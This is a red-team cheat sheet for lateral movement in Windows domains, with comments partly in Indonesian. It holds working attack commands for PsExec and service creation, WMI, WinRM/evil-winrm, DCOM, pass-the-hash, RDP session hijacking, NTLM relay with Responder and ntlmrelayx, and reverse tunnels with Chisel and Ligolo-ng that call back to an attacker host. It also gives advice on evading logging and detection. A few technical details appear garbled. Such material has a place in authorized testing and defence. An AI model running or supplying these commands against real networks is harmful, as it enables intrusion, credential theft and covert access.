# ad-misc-lateral — misc

# Reference: Windows Lateral Movement

## 1. PsExec (SMB + Service Control Manager)

**Mechanism:** Create a service via RPC over SMB (`\pipe\svcctl`), upload the binary to the ADMIN$ share, start the service → the binary executes the command.

| Item | Detail |
|---|---|
| Port | 445/tcp (SMB), 135/tcp (RPC mapper) |
| Prerequisites | Local/domain admin credentials (or hash via SMB), writable `ADMIN$`, `SERVICE_CREATE` |
| Disk artifacts | `PSEXESVC.exe` in `C:\Windows`, event 7045 (Service Install) in the System log |

```powershell
# Sysinternals
PsExec.exe \\10.10.10.5 -u DOMAIN\svc_admin -p Passw0rd cmd.exe

# Impacket (remote, tanpa Sysinternals di target)
impacket-psexec DOMAIN/admin:'Passw0rd'@10.10.10.5
impacket-psexec -hashes :NTHASH administrator@10.10.10.5   # Pass-the-Hash

# Manual (stealthier, tanpa PSEXESVC.exe di ADMIN$):
sc \\10.10.10.5 create evilsvc binpath="C:\Windows\Temp\shell.exe" start= auto
sc \\10.10.10.5 start evilsvc
sc \\10.10.10.5 delete evilsvc
```

**Why it works:** Authenticated SCM RPC → if ADMIN$ is writable, you're already admin.
**Why it fails / is risky:** Events 4697/7045 are super-noisy; `ADMIN$` sharing disabled; Protected Users group (bans NTLM-type logons).

---

## 2. WMI (DCOM + `DCOMLaunch`)

**Mechanism:** RPC to `ROOT\cimv2`, execution via `Win32_Process.Create` / `Win32_Service`.

| Port | 135/tcp + ephemeral 49152–65535 (DCOM) |

```powershell
# One-liner via pwsh/WMI
wmic /node:10.10.10.5 /user:DOMAIN\svc_admin /password:Passw0rd process call create "cmd /c whoami > C:\Windows\Temp\o.txt"

# PowerShell remote WMI
Invoke-CimMethod -ClassName Win32_Process -ComputerName 10.10.10.5 -Credential $cred `
  -MethodName Create -Arguments @{CommandLine="cmd /c C:\Windows\Temp\shell.exe"}

# Impacket
impacket-wmiexec DOMAIN/admin:'Passw0rd'@10.10.10.5
impacket-wmiexec -hashes :NTHASH administrator@10.10.10.5
```

**Advantages:** no binary drop, no service → quieter than PsExec. Logs: `4648` (logon), WMI-Activity Operational log.
**Fails if:** DCOM disabled (hardening), firewall blocks the ephemeral RPC range, workstation without Remote WMI ACL.

---

## 3. WinRM (HTTP(S) SOAP, PSRemoting)

| Port | 5985/tcp (HTTP), 5986/tcp (HTTPS) |
|---|---|
| Prerequisites | `TrustedHosts`/Kerberos configured, user in the `Remote Management Users` group, or admin |

```powershell
# Target (jika punya RCE): aktifkan
Enable-PSRemoting -Force
winrm quickconfig

# Client
$password = ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\svc_admin', $password)
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -ScriptBlock { whoami }

# Shell interaktif
Enter-PSSession -ComputerName 10.10.10.5 -Credential $cred

# Relay via SOCKS proxy (chisel)
$pow = New-PSSessionOption -ProxyAccessType IEConfig
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -SessionOption (New-PSSessionOption -ProxyAccessType None) # + proxychains
```

**What gets sent:** SOAP envelope + PS payload (EncodedCommand base64 if needed). Logs: PowerShell 4103/4104 (ScriptBlock), Event 4624 type 3.
**Crimson / evil-winrm:**
```bash
evil-winrm -i 10.10.10.5 -u svc_admin -p 'Passw0rd'
evil-winrm -i 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTHASH
```

---

## 4. DCOM Lateral Movement (without WinRM/WMI-exe)

```powershell
# MMC20.Application (default di Windows 10/11, Server 2016/2019/2022)
$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.5"))
$c.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c C:\Windows\Temp\shell.exe","7")

# ShellWindows (butuh Explorer jalan, cocok untuk Windows 7: browser-core)
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.5"))
$shell.Item().Document.Application.ShellExecute("cmd.exe","/c calc","C:\Windows\System32","open",0)

# ExcelDDE / Visio — cek ketersediaan produk
```

**Why it succeeds:** DCOM ProgID legacy compatibility, works on networks "without WinRM". Logs are almost nonexistent (no logon type 3, the result is "network logon via RPCSS" — mostly only remote activation access via DCOM).
**Block:** DCOM hardening (KB5004441-style registry: `RestrictRemoteActivation`) on Windows Server 2016+/Windows 10+.

---

## 5. RDP Hijacking (Session Shadow / tscon)

**Context:** you have SYSTEM/target credentials, the RDP session is still DISCONNECTED (not logged off).

```
Target 10.10.10.5, sesi admin user id=4 (cek: quser / query session)
```

```cmd
:: Sebagai SYSTEM via PsExec/sch
query session
tscon 4 /dest:console               ; hijack ke console session (phishing alert)

:: Dengan creds user lain:
tscon 4 /SERVER:10.10.10.5 /password:Passw0rd /user:DOMAIN\upduser
```

**Why it works:** `tscon` with SE_TCB/SE_TakeOwnership privileges creates a new token without a new logon — Windows treats it like a normal reconnect, no Event 4624 type 10 appears (type 2/3 appear in local SYSTEM).
**Fails if:** Wrong session ID → data loss; logged-off session (4445/4778 doesn't appear); RDP NLA + disconnected→killed by `TimeLimit`/`EndSession` GPO.

---

## 6. SMB Relay (ntlmrelayx)

**Mechanism:** Intercept NTLM challenge-response (Auth → amplify credentials → SMB target) — passing the challenge, not the hash, target must have SMB signing disabled.

| SMB relay conditions | How to check |
|---|---|
| Signing disabled | `crackmapexec smb 10.10.10.0/24 --gen-relay-list` / nmap `smb-security-mode` |
| Target ≠ host asal | SMB hardening: no loopback relay |
| Creds serializable | must be admin on target |

```bash
# Cek signing
nmap -p445 --script smb-security-mode 10.10.10.5
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Relay ke SMB
impacket-ntlmrelayx -tf relay.txt -smb2support           # dump SAM
impacket-ntlmrelayx -tf relay.txt -smb2support -c 'powershell -enc <b64>'

# Relay ke LDAP (DC, untuk credential/ACL add)
impacket-ntlmrelayx -t ldap://10.10.10.10 --delegate-access    # RBCD on ADCS/RBCD
impacket-ntlmrelayx -t ldap://10.10.10.10 --escalate-user svc_web

# Trigger auth (harus punya input ke target):
Responder -I eth0 -v                    # LLMNR/NBT-NS poison (jangan -A kalau mau SMB relay)
# Coercion: via shell di host lain (PetitPotam ~MSRPC-MS-EFSR, DFSCoerce, PrinterBug)
```

**Why it works:** SMB signing defaults to "enabled but not required" on Windows 10/11 → can relay; LDAP defaults to no signing.
**Fails if:** SMB Signing required (Windows Server DC defaults to required!) → have to go to port 445/636 LDAP; target has Protected Users mitm; **SMB signing defaults to required on Windows 11 24H2/Server 2025** — relaying to modern hosts will fail; there is Patch MS16-075-type AMP protection; `--no-mdm` in Responder (disable the HTTP server so it doesn't stop SMB relay).

---

## 7. Pivoting — Chisel

**Reverse TCP tunnel with SOCKS5.**

```bash
# Attack box (server)
chisel server -p 8000 --reverse

# Target (reverse client, unduh binary ke target)
./chisel.exe client 10.20.20.10:8000 R:socks
# atau single-port forward (mis. untuk port 3389 RDP)
./chisel.exe client 10.20.20.10:8000 R:3389:10.10.10.5:3389
```

| Metadata | Value |
|---|---|
| Kompabilitas | Windows 7+ single exe, no deps |
| Socks port default | 1080 (socks5) |
| Evade proxy | `--header "Host: cdn.example"` via corporate HTTP proxy |

After tunnel:
```bash
# /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains crackmapexec smb 10.10.10.0/24 -u user -p pass
proxychains impacket-wmiexec DOMAIN/admin:'Pass'@10.10.10.5
```

**What shows up:** TLS/plain TCP visible at egress; If `--reverse` with auth `user:pass` needs modification: `chisel server -p 8000 --reverse --auth user:pass`.

---

## 8. Pivoting — Ligolo-ng

**TUN-based reverse tunnel = total meaning: client via virtual interface, not SOCKS (except proxy mode).**

```bash
# Attack box (agent -i interface)
sudo ip tuntap add user darma mode tun ligolo
sudo ip link set ligolo up
sudo ligolo_proxy -selfcert                  # generate cert
sudo ligolo_proxy -certfile cert.pem -keyfile key.pem -listen 0.0.0.0:11601

# Target (agent)
ligolo_agent.exe -connect 10.20.20.10:11601 -ignore-cert
# Di ligolo console:
ifconfig   → pilih interface tun ligolo
ip addr add 10.10.10.5/32 dev ligolo        # routing manual per target/subnet
```

| Banding | Chisel | Ligolo-ng |
|---|---|---|
| Mode | SOCKS5 (per-tool proxychains) | TUN interface (all tools run directly) |
| Performance | OK | Faster (Go QUIC-encapsulated TCP, UDP-supported) |
| Tools needing configuration | All (nmap, cme, rdp) | Zero |

**What gets sent:** QUIC/TLS (UDP 11601 or TCP) egress from the target — at the egress-allowlist, UDP can be blocked.
**Why it fails:** corporate proxy without CONNECT/UDP; DPI against QUIC; admin cannot add TUN (needs sudo/admin).

---

## Operational Pitfalls (Fail-Modes in the Field)

1. **SMB Relay exhausted** — Windows 11 24H2 / Server 2025: SMB signing *required* by default. Relay to modern targets fails silently; test with `cme --gen-relay-list` *before* the operation, don't assume.
2. **Ephemeral port firewall for WMI/DCOM** — 135 is fine but 49152+ is blocked. PsExec over 445 isn't affected by this — choose technique based on filtering, not preference.
3. **`ADMIN$` share disabled** by hardening (uninstall admin share) → PsExec/`psexec` fails, but WMI/WinRM still work.
4. **LAPS/Local admin double remote** — Windows 11 23H2+/Server 2025 built-in: use a LAPS-managed account credential, not a legacy PBKDF user. NTLM to ADCS/DC from a non-ACL LAPS account may still work, but don't forget `WDigest`.
5. **Protected Users group** — NTLM can't be PTH-able, only Kerberos; PsExec/wmiexec with hash fails silently.
6. **Duplicate/extend proxychains bug** — nmap over SOCKS5 with `-sT` only; `proxychains nmap -sS` **never works** → many red teamers get stuck.
7. **Chisel reverse without `--reverse` flag on server** → `R:socks` fails, error "reverse not enabled".
8. **Ligolo without `ip addr add`** → routing not OK, all tools timeout silently. Literally #1 pain.
9. **tscon wrong session ID** → `quser` again and verify STATE `Disc` not `Down`; hijacking an Active session by mistake → locks the target screen & SOC alarm.
10. **WinRM TrustedHosts** — unique: `Invoke-Command` NTLM to hostname instead of FQDN fails; workgroup only defaults to `TrustedHosts` after `winrm quickconfig`. Fix: `Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force`.
11. **RDP NLA + disconnected session in 30 minutes (GPO)** → RDP hijack gets through a narrow window; check `quser` *before* working.
12. **Important — disable Responder servers in SMB relay** (Responder defaults to SMB active) — auth challenge mismatch eats the relay. Use `responder -I eth0 --disable-SMB` or `-A` don't.

---

## Tooling References

| Tool | Versi uji |
|---|---|
| chisel | 1.9.0 |
| ligolo-ng | 0.7.x |
| impacket | 0.12.0.dev1 |
| evil-winrm | 3.0 |
| crackmapexec | netexec v1.2.0 (continuation) |
| Sysinternals PsExec | 2.2+ (v2.6 terakhir) |

Target-hypothesis default: Windows Server 2019/2022 DC, Windows 10 21H2 / Windows 11 23H2 workstation — the techniques above apply; for 24H2 re-test signing & LAPS.

---

## [reasoning trace]


